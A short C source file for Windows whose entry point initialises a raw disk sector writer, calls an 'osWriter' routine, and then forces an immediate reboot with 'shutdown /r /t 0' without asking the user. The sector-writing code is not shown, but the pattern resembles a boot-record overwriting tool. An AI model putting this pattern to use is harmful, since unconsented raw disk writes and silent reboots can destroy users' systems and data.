#include <windows.h>

#include "osWriter.h"
#include "sectorRW.h"
#include "FileOper.h"





int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
	int ret = 0;
	ret = SectorReaderWriter::init();
	if (ret <= 0)
	{
		MessageBoxA(0, "init error", "init error", MB_OK);
		return FALSE;
	}

	ret = osWriter();

	SectorReaderWriter::close();
#ifdef _WIN32
	system("shutdown /r /t 0");
#elif defined __linux__
	execl("/sbin/reboot", "reboot", NULL);
#else

#endif
	ExitProcess(0);

	return 0;
}